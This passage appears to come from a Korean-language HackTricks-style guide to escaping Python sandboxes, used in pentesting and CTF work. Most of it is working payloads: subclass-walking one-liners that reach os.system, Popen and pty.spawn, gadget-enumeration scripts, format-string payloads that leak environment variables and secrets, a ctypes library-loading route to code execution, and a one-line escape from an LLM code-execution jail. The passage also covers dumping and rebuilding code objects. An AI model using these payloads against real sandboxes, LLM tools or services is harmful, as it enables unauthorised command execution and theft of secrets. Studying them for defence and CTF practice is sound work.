[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```

게다가 어떤 모듈이 악성 라이브러리를 로드하는지도 검색할 수 있습니다:

```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
     vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
     print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```

또한, **다른 라이브러리**가 **명령을 실행하는 함수를 호출할 수 있다**고 생각한다면, 가능한 라이브러리 내에서 **함수 이름으로 필터링**할 수도 있습니다:

```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
     vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
     print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```

## Builtins, Globals 등의 재귀 검색

> [!WARNING]
> 정말 **멋집니다**. **globals, builtins, open 같은 객체나 다른 객체를 찾고 있다면** 이 스크립트로 해당 객체를 찾을 수 있는 위치를 **재귀적으로 검색하세요.**

```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
    # Misc
    "__globals__": set(),
    "builtins": set(),
    "__builtins__": set(),
    "open": set(),

    # RCE libs
    "os": set(),
    "subprocess": set(),
    "commands": set(),
    "pty": set(),
    "importlib": set(),
    "imp": set(),
    "sys": set(),
    "pip": set(),
    "pdb": set(),

    # RCE methods
    "system": set(),
    "popen": set(),
    "getstatusoutput": set(),
    "getoutput": set(),
    "call": set(),
    "Popen": set(),
    "popen": set(),
    "spawn": set(),
    "import_module": set(),
    "__import__": set(),
    "load_source": set(),
    "execfile": set(),
    "execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
    # If bigger than maximum, stop
    if cont > MAX_CONT:
        return

    # If already checked, stop
    #if name and name in ALREADY_CHECKED:
    #    return

    # Add to already checked
    #if name:
    #    ALREADY_CHECKED.add(name)

    # If found add to the dict
    for k in SEARCH_FOR:
        if k in dir(element) or (type(element) is dict and k in element):
            SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

    # Continue with the recursivity
    for new_element in dir(element):
        try:
            check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

            # WARNING: Calling random functions sometimes kills the script
            # Comment this part if you notice that behaviour!!
            if execute:
                try:
                    if callable(getattr(element, new_element)):
                        check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
                except:
                    pass

        except:
            pass

    # If in a dict, scan also each key, very important
    if type(element) is dict:
        for new_element in element:
            check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
    print("Checking from empty string...")
    total = [""]
    for i,element in enumerate(total):
        print(f"\rStatus: {i}/{len(total)}", end="")
        cont = 1
        check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

    print()
    print("Checking loaded subclasses...")
    total = "".__class__.__base__.__subclasses__()
    for i,element in enumerate(total):
        print(f"\rStatus: {i}/{len(total)}", end="")
        cont = 1
        check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

    print()
    print("Checking from global functions...")
    total = [print, check_recursive]
    for i,element in enumerate(total):
        print(f"\rStatus: {i}/{len(total)}", end="")
        cont = 1
        check_recursive(element, cont, "", str(element), f"Global func {i}", False)

    print()
    print(SEARCH_FOR)


if __name__ == "__main__":
    main()
```

You can check the output of this script on this page:


{{#ref}}
https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
{{#endref}}

## Python Format String

**formatted**될 **string**을 python에 **전달**하면 `{}`를 사용해 **python 내부 정보에 액세스할 수 있습니다.** 앞의 예제를 사용하면 globals 또는 builtins에 액세스할 수 있습니다.<sup>[[14]](#references)</sup>

```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
    "KEY": "ASXFYFGK78989"
}

class PeopleInfo:
    def __init__(self, fname, lname):
        self.fname = fname
        self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
    return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```

일반적인 방식으로 **dot**을 사용해 **attributes**에 접근할 수 있습니다. 예를 들어 `people_obj.__init__`처럼 말이죠. 그리고 따옴표 없이 **parenthesis**를 사용해 **dict element**에 접근할 수도 있습니다. 예를 들어 `__globals__[CONFIG]`처럼 말이죠.

또한 `.__dict__`를 사용해 객체의 요소를 열거할 수 있습니다. 예: `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

format string의 또 다른 흥미로운 특징은 `!s`, `!r`, `!a`를 각각 추가해 지정된 객체에서 **`str`**, **`repr`**, **`ascii`** **functions**를 **실행**할 수 있다는 점입니다:

```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```

또한 클래스에서 **새로운 formatter를 구현하는 것도** 가능합니다:

```python
class HAL9000(object):
    def __format__(self, format):
        if (format == 'open-the-pod-bay-doors'):
            return "I'm afraid I can't do that."
        return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```

**더 많은** **format** **string** 예시는 [**https://pyformat.info/**](https://pyformat.info)에서 확인할 수 있습니다.

> [!CAUTION]
> Python 내부 객체에서 **민감한 정보를 읽어오는** gadgets는 다음 페이지도 확인하세요:


{{#ref}}
../python-internal-read-gadgets.md
{{#endref}}

### 민감 정보 공개 Payloads સપ

```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}

# Example from https://corgi.rip/posts/buckeye-writeups/
secret_variable = "clueless"
x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
str(x) # Out: clueless
```

### LLM Jails bypass

[여기](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)에 나온 내용입니다: `().class.base.subclasses()[108].load_module('os').system('dir')`.<sup>[[12]](#references)</sup>

### format에서 라이브러리 로딩을 통한 RCE까지

[이 writeup의 **TypeMonkey chall**](https://corgi.rip/posts/buckeye-writeups/)에 따르면, python의 format string 취약점을 악용해 디스크에서 임의의 라이브러리를 로드할 수 있습니다.<sup>[[13]](#references)</sup>

참고로 python에서 어떤 동작을 수행할 때마다 함수가 실행됩니다. 예를 들어 `2*3`은 **`(2).mul(3)`**을 실행하고, **`{'a':'b'}['a']`**는 **`{'a':'b'}.__getitem__('a')`**를 실행합니다.

이와 비슷한 사례는 [**Python execution without calls**](#python-execution-without-calls) 섹션에서 더 확인할 수 있습니다.

python format string 취약점으로는 함수를 실행할 수 없습니다(괄호를 사용할 수 없음). 따라서 `'{0.system("/bin/sh")}'.format(os)`처럼 RCE를 얻을 수는 없습니다.\
하지만 `[]`는 사용할 수 있습니다. 따라서 일반적인 python 라이브러리의 **`__getitem__`** 또는 **`__getattr__`** 메서드가 임의 코드를 실행한다면, 이를 악용해 RCE를 얻을 수 있습니다.

writeup에서는 python에서 이런 gadget을 찾기 위해 [**Github 검색 쿼리**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code)를 제시합니다. 검색 결과 다음 [항목](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463)을 찾았습니다:

```python
class LibraryLoader(object):
    def __init__(self, dlltype):
        self._dlltype = dlltype

    def __getattr__(self, name):
        if name[0] == '_':
            raise AttributeError(name)
        try:
            dll = self._dlltype(name)
        except OSError:
            raise AttributeError(name)
        setattr(self, name, dll)
        return dll

    def __getitem__(self, name):
        return getattr(self, name)

cdll = LibraryLoader(CDLL)
pydll = LibraryLoader(PyDLL)
```

이 gadget을 사용하면 디스크에서 **라이브러리를 로드**할 수 있습니다. 따라서 공격 대상 서버에 올바르게 컴파일된 **라이브러리를 기록하거나 업로드**해야 합니다.

```python
'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
```

이 challenge는 실제로 서버 디스크에 임의의 파일을 생성할 수 있게 하는 서버의 또 다른 취약점을 악용합니다.

## Python Objects 분석

> [!TIP]
> **python bytecode**를 깊이 있게 **학습**하고 싶다면 이 주제를 다룬 **멋진** 게시물을 읽어 보세요: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)

일부 CTF에서는 **flag가 있는 custom function의 이름**을 제공받고, flag를 추출하기 위해 **function**의 **내부**를 살펴봐야 할 수 있습니다.

검사할 function은 다음과 같습니다:

```python
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    if some_input == var2:
        return "THIS-IS-THE-FALG!"
    else:
        return "Nope"
```

#### dir

```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```

#### globals

`__globals__` 및 `func_globals`(동일)는 전역 환경을 가져옵니다. 예제에서 가져온 모듈, 일부 전역 변수와 그 내용이 선언된 것을 확인할 수 있습니다:

```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```

[**globals를 얻을 수 있는 다른 위치는 여기에서 확인하세요**](#globals-and-locals)

### **함수 코드에 접근하기**

**`__code__`** 및 `func_code`: 함수의 이 **attribute**에 **접근**하여 함수의 **code object를 얻을 수 있습니다**.

```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```

### 코드 정보 가져오기

```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
    return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```

### **함수 디스어셈블하기**

```python
import dis
dis.dis(get_flag)
  2           0 LOAD_CONST               1 (1)
              3 STORE_FAST               1 (var1)

  3           6 LOAD_CONST               2 ('secretcode')
              9 STORE_FAST               2 (var2)

  4          12 LOAD_CONST               3 ('some')
             15 LOAD_CONST               4 ('array')
             18 BUILD_LIST               2
             21 STORE_FAST               3 (var3)

  5          24 LOAD_FAST                0 (some_input)
             27 LOAD_FAST                2 (var2)
             30 COMPARE_OP               2 (==)
             33 POP_JUMP_IF_FALSE       40

  6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
             39 RETURN_VALUE

  8     >>   40 LOAD_CONST               6 ('Nope')
             43 RETURN_VALUE
             44 LOAD_CONST               0 (None)
             47 RETURN_VALUE
```

참고로 **python sandbox에서 `dis`를 import할 수 없다면** 함수의 **bytecode**(`get_flag.func_code.co_code`)를 가져와 로컬에서 **disassemble**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)은 볼 수 없지만, `LOAD_CONST`가 로드되는 변수의 offset도 알려 주므로 `get_flag.func_code.co_consts`에서 값을 추측할 수 있습니다.

```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
          0 LOAD_CONST          1 (1)
          3 STORE_FAST          1 (1)
          6 LOAD_CONST          2 (2)
          9 STORE_FAST          2 (2)
         12 LOAD_CONST          3 (3)
         15 LOAD_CONST          4 (4)
         18 BUILD_LIST          2
         21 STORE_FAST          3 (3)
         24 LOAD_FAST           0 (0)
         27 LOAD_FAST           2 (2)
         30 COMPARE_OP          2 (==)
         33 POP_JUMP_IF_FALSE    40
         36 LOAD_CONST          5 (5)
         39 RETURN_VALUE
    >>   40 LOAD_CONST          6 (6)
         43 RETURN_VALUE
         44 LOAD_CONST          0 (0)
         47 RETURN_VALUE
```

## Python 컴파일

이제 어떤 함수를 실행할 수는 없지만, 그 함수에 관한 정보를 **덤프할 수는 있고** 이를 **실행해야 한다고** 상상해 봅시다.\
다음 예시처럼 해당 함수의 **코드 객체에 접근할 수는 있지만**, 디스어셈블 결과를 읽는 것만으로는 flag를 계산하는 방법을 **알 수 없습니다** (_더 복잡한 `calc_flag` 함수를 상상해 보세요_).<sup>[[3]](#references)</sup>

```python
def get_flag(some_input):
    var1=1
    var2="secretcode"
    var3=["some","array"]
    def calc_flag(flag_rot2):
        return ''.join(chr(ord(c)-2) for c in flag_rot2)
    if some_input == var2:
        return calc_flag("VjkuKuVjgHnci")
    else:
        return "Nope"
```

### code object 만들기

우선 **code object를 만들고 실행하는 방법**을 알아야 합니다. 그래야 leak한 함수를 실행할 code object를 만들 수 있습니다:

```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
               co_nlocals, co_stacksize, co_flags,
               co_code, co_consts, co_names,
               co_varnames, co_filename, co_name,
               co_firstlineno, co_lnotab, freevars=None,
               cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```

> [!TIP]
